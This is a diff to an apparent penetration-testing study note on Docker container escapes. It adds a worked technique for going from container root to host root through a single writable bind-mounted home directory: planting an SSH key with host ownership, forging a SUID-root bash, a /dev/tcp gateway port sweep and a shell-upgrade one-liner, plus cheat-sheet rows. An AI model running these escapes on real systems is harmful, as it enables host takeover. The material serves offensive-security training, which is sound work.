@@ -180,7 +180,8 @@ Even an unprivileged container escapes trivially if it was handed the wrong moun
 
 | Mounted in | Escape |
 |---|---|
-| `/` or `/root`, `/home` | Read/write host files directly; drop an SSH key, edit `/etc/passwd`, cron |
+| `/` or `/root` | Read/write host files directly; drop an SSH key, edit `/etc/passwd`, cron |
+| A **single** host dir, rw (e.g. `/home/bob`) | You can't chroot, but container-root sets owner+mode → [forge a SUID-root bash / `authorized_keys`](#writable-bind-mount-of-a-single-host-path-youre-root-on-the-container-side) |
 | `/var/run/docker.sock` | See [Docker socket](#docker-socket-exposed) |
 | `/etc` | Add a root user / sudoers entry |
 | Host `/proc` (rw) | `core_pattern` handler below |
@@ -196,6 +197,46 @@ echo "|$host/exp" > /proc/sys/kernel/core_pattern
 tail -f /dev/null & sleep 1; kill -SIGSEGV %1
 ```
 `cdk run core-pattern` does this end-to-end with a reverse shell.
+
+### Writable bind-mount of a *single* host path (you're root on the container side)
+
+The table above assumes the mount is `/`, `/etc`, or `/root` — mount the disk, `chroot`, done. The subtler and more common case: **only one host directory is bind-mounted** — often a user's home (`/home/bob`), not a system path. You can't `chroot` and there's no `/etc/passwd` to edit through it. It's still a full escape, because a **rw bind mount carries file *metadata*, not just contents** — and you are **root on the container side**, so you set ownership and mode bits that a host user can't set for themselves. Two payloads come off that one primitive:
+
+```bash
+# --- enumerate: is there an anomalous host-disk mount? ---
+mount | grep -E '/dev/(sd|nvme|vd)'
+# Docker ALWAYS bind-mounts these three from the host disk — they are NORMAL, ignore them:
+#   /dev/sda1 on /etc/resolv.conf
+#   /dev/sda1 on /etc/hostname
+#   /dev/sda1 on /etc/hosts
+# The finding is a host-disk mount on ANY OTHER path, e.g.:
+#   /dev/sda1 on /home/bob type ext4 (rw,relatime,...)   <-- the seam
+```
+
+The host user (`bob`) can't `chown root` a file; **container-root can**, and the owner/mode cross the mount to the host side. So:
+
+```bash
+# Payload A — plant an SSH key to become that host user (no reusable password needed).
+#   Read the user's NUMERIC uid off the mount itself — the container's /etc/passwd is
+#   the CONTAINER's, so its names/uids need not match the host:
+uid=$(stat -c '%u' /home/bob)
+mkdir -p /home/bob/.ssh && echo 'ssh-ed25519 AAAA... you@kali' > /home/bob/.ssh/authorized_keys
+chown -R "$uid:$uid" /home/bob/.ssh          # ownership crosses to the host
+chmod 700 /home/bob/.ssh && chmod 600 /home/bob/.ssh/authorized_keys   # sshd StrictModes
+# then SSH in as bob (see the gateway note below if external :22 is closed)
+
+# Payload B — forge a SUID-root shell for that host user to run.
+#   Copy bash on the HOST side (host libc), set the SUID bit from the CONTAINER side:
+# on the HOST (as bob):        cp /bin/bash /home/bob/bash
+# in the CONTAINER (as root):  chown root:root /home/bob/bash && chmod 4755 /home/bob/bash
+# on the HOST (as bob):        /home/bob/bash -p        # -p is MANDATORY -> euid=0
+```
+
+> [!warning] **Two silent traps.** (1) `bash -p` or nothing — bash drops its effective uid when `euid != uid` unless `-p` is passed; without it the shell "works" and `id` shows the plain user. (2) `chmod root:root` + `4755`, **not** `g+s` — `g+s` sets egid 0 only. Same gotcha table as [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc#SUID / SGID Binaries|Linux Priv Esc → SUID]]. Copy bash on the **host** side — a container binary is built against a different libc and may not run on the host.
+
+> [!tip] **The host is one hop away — through the bridge, not the internet.** The container's default gateway *is* the host (`ip route` → `default via 172.x.0.1`). SSH is frequently **open on that internal interface but firewalled off externally**, which is why your external nmap saw only the web port. Sweep the gateway from inside (`for p in 22 2222; do (echo >/dev/tcp/172.19.0.1/$p) 2>/dev/null && echo "$p open"; done`) and SSH there with the key/creds above. Note: SSH **password** auth fails from a raw reverse shell with no TTY in a way that mimics a bad credential — upgrade first (`python -c 'import pty;pty.spawn("/bin/bash")'`).
+
+**Why this beats the generic vectors:** everything else can be hardened and this still works. When you find cgroups **ro**, `/proc/sys` **ro**, no `docker.sock`, and `/proc/kcore`/`keys`/`sched_debug` tmpfs-masked, that's **stock Docker hardening, not `--privileged`** — the generic escapes are all closed. The one thing left is a mount the operator *chose* to add. Hardened-everywhere-except-one-mount is the signature of exactly this escape.
 
 ---
 
@@ -235,6 +276,7 @@ Rare in practice and thin compared to Linux. Windows Server (process-isolated) c
 | `docker` group | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
 | `lxd` group | `lxc init esc c1 -c security.privileged=true; lxc config device add c1 h disk source=/ path=/mnt recursive=true` |
 | Privileged / host disk visible | `mount /dev/sda1 /mnt/host && chroot /mnt/host` |
+| One rw host dir mounted (`/home/x`) | Container-root forges owner+mode: `chown root:root x/bash && chmod 4755 x/bash` → host runs `bash -p` |
 | `CAP_SYS_ADMIN`, no disk | cgroup `release_agent` PoC / `cdk run release_agent` |
 | `CAP_SYS_MODULE` | `insmod` an LKM calling `call_usermodehelper()` |
 | `CAP_DAC_READ_SEARCH` | `open_by_handle_at` file read ("shocker") |
